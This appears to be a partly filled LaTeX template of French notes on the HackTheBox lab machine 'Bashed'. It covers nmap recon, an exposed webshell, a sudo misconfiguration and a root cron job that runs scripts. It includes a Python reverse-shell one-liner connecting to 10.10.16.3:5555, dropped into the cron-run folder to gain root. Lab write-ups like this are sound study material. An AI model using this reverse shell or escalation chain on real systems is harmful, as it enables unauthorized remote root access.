\chapter{Bashed}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.10.68
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ sudo nmap -sVC -p$PORTS $TARGET_IP

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

\end{verbatim}

\subsubsection{http}

dans \verb+/dev/+ il y a les webshell

on a wget donc on devrait pouvoir envoyer des trucs

\begin{verbatim}
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL


sudo -u scriptmanager ls -al /home/scriptmanager
\end{verbatim}
en fait on peut lire dans \verb+~arrexel+

\begin{verbatim}
2022/11/15 22:54:01 CMD: UID=0    PID=60374  | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2 07:19 scripts
www-data@bashed:/var/www/html/uploads$ sudo -u scriptmanager ls -al /scripts
sudo -u scriptmanager ls -al /scripts
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2 07:19 .
drwxr-xr-x 23 root          root          4096 Jun  2 07:25 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Nov 15 22:55 test.txt



$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' > rev.py

$ sudo -u scriptmanager cp rev.py /scripts
\end{verbatim}

\subsection{Foothold}
\subsubsection{x}
\begin{verbatim}
\end{verbatim}

\subsubsection{x}

\begin{verbatim}

\end{verbatim}

\begin{verbatim}

\end{verbatim}
\section{Theorie}


